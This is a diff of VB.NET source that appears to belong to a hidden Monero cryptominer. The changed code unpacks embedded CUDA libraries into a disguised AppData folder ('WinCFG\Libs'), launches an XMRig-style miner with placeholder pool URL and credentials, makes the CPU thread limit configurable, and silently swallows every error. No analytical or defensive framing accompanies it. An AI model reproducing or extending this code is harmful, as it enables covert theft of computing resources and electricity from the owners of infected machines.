@@ -11,6 +11,7 @@ Imports System.Collections.Generic
 Imports System.Drawing
 Imports System.Windows.Forms
 Imports System.IO
+Imports System.IO.Compression
 Imports System.Net
 Imports System.Drawing.Drawing2D
 Imports System.Drawing.Imaging
@@ -102,18 +103,20 @@ Public Class Program
             Dim xmr As Byte() = GetTheResource("#xmr")
             Dim baseDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\WinCFG\Libs\"
             If Not String.IsNullOrEmpty("#EnableGPU") Then
-                Dim cuda1 As Byte() = GetTheResource("#cuda1")
-                Dim cuda2 As Byte() = GetTheResource("#cuda2")
-                Dim cuda3 As Byte() = GetTheResource("#cuda3")
+                Dim libs As Byte() = GetTheResource("#libs")
+                Dim libsPath As String = baseDir + "libs.zip"
 
                 System.IO.Directory.CreateDirectory(baseDir)
 
-                My.Computer.FileSystem.WriteAllBytes(baseDir + "ddb64.dll", cuda1, False)
-                My.Computer.FileSystem.WriteAllBytes(baseDir + "nvrtc64_101_0.dll", cuda2, False)
-                My.Computer.FileSystem.WriteAllBytes(baseDir + "nvrtc-builtins64_101.dll", cuda3, False)
+                Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
+                    For Each entry As ZipArchiveEntry In archive.Entries
+                        entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
+                    Next
+                End Using
+
             End If
 
-            Run(GetTheResource("#dll"), "#EnableGPU -B --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=10 --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --donate-level=5 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote, xmr)
+            Run(GetTheResource("#dll"), "-B #EnableGPU --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --donate-level=5 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote, xmr)
         Catch ex As Exception
         End Try
     End Sub
